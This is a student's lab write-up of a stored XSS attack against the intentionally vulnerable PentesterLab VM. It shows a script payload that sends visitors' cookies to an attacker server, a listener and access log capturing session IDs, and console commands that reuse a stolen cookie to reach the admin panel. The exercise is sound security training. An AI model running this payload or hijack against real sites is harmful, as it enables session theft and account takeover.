# Testing XSS injection on a vulnerable VM 2018-08-21

__Sources__:http://terokarvinen.com/2018/penetration-testing-course-autumn-2018\
https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/\
https://pentesterlab.com/exercises/xss_and_mysql_file/course

Using the debian ISO in a virtual machine with already running(and vulnerable) LAMP-stack as the target, I began to experiment with basic XSS-injection. The first test was posting a comment with `1337'"><` as the payload to see whether the blog's comments are vulnerable: No sanitization is performed on the comments, so the exercise may proceed.

The second step is injecting the actual exploit
```
<script>document.write('<img src="http://<server ip>/?'+document.cookie+'  "/>');</script>
```
```$ socat TCP-LISTEN:80,reuseaddr,fork -
2018/08/21 13:05:01 socat[20055] E bind(5, {AF=2 0.0.0.0:80}, 16): Permission denied
$ sudo socat TCP-LISTEN:80,reuseaddr,fork -
2018/08/21 13:05:11 socat[20057] E bind(5, {AF=2 0.0.0.0:80}, 16): Address already in use```
...this could be a problem. Socat does not seem to work as it's supposed to in the walkthrough. Time to grab the tail manually.
```/var/log/apache2$ tail access.log
193.166.11.250 - - [21/Aug/2018:12:55:22 +0000] "GET / HTTP/1.1" 200 420 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
193.166.11.250 - - [21/Aug/2018:12:55:22 +0000] "GET /favicon.ico HTTP/1.1" 404 622 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
193.166.11.250 - - [21/Aug/2018:12:55:22 +0000] "GET /favicon.ico HTTP/1.1" 404 623 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
193.166.11.250 - - [21/Aug/2018:13:03:38 +0000] "GET /? HTTP/1.1" 200 420 "http://127.0.0.1:8080/post.php?id=2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
193.166.11.250 - - [21/Aug/2018:13:04:07 +0000] "GET /?PHPSESSID=s3nha7ql33b3jpjb6ic2crfot6 HTTP/1.1" 200 420 "http://127.0.0.1/post.php?id=2" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.1 Safari/534.34"
193.166.11.250 - - [21/Aug/2018:13:05:07 +0000] "GET /?PHPSESSID=vcof448v99vbp7h75otbpl4fp4 HTTP/1.1" 200 420 "http://127.0.0.1/post.php?id=2" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.1 Safari/534.34"
193.166.11.250 - - [21/Aug/2018:13:06:07 +0000] "GET /?PHPSESSID=h7tuidssu1662va8daq10dv8v6 HTTP/1.1" 200 420 "http://127.0.0.1/post.php?id=2" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.1 Safari/534.34"
193.166.11.250 - - [21/Aug/2018:13:07:07 +0000] "GET /?PHPSESSID=t25u064gc4bdnm9hk3lie716l4 HTTP/1.1" 200 420 "http://127.0.0.1/post.php?id=2" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.1 Safari/534.34"
193.166.11.250 - - [21/Aug/2018:13:08:06 +0000] "GET /?PHPSESSID=i9d0efm1qgiljaafuhnjgufbf3 HTTP/1.1" 200 420 "http://127.0.0.1/post.php?id=2" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.1 Safari/534.34"
193.166.11.250 - - [21/Aug/2018:13:09:06 +0000] "GET /?PHPSESSID=o498vuudg1qqb132l1jq7i2kc2 HTTP/1.1" 200 420 "http://127.0.0.1/post.php?id=2" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.1 Safari/534.34"
```
Bingo. Adding the cookie on the browser's js console with `document.cookie = "PHPSESSID=o498vuudg1qqb132l1jq7i2kc2"` allows access to the administrator panel of the blog.
